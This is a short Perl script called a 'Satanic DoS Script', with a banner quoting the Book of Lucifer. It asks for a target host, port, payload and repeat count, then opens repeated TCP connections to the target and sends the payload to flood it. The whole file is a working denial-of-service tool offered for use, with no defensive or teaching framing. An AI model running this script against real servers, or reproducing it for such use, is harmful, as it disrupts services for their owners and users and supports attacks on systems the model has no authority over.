#!/usr/bin/perl

use IO::Socket;
print q{ 

 "The Satanist has always ruled the earth... and always will, by whatever name he is called." (Book of Lucifer) 
 
            <><><><><><><><><><><><><><><><><><>
                    Satanic DoS Script
            <><><><><><><><><><><><><><><><><><>
};

print "Host » ";
$serv = <stdin>;
chop ($serv);

print "Port » ";
$port = <stdin>;
chop ($port);

print "Data » ";
$data = <stdin>;
chop($data);

print "Times To Flood » ";
$times = <stdin>;
chop ($times);

for ($i=0; $i<$times; $i++)
{
$flood = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "$port") || print "[!] Server Down!\n";
print $flood $data;
syswrite STDOUT, "[!] Attacking - ".$i."\n";
}

print "[!] End of flood.\n";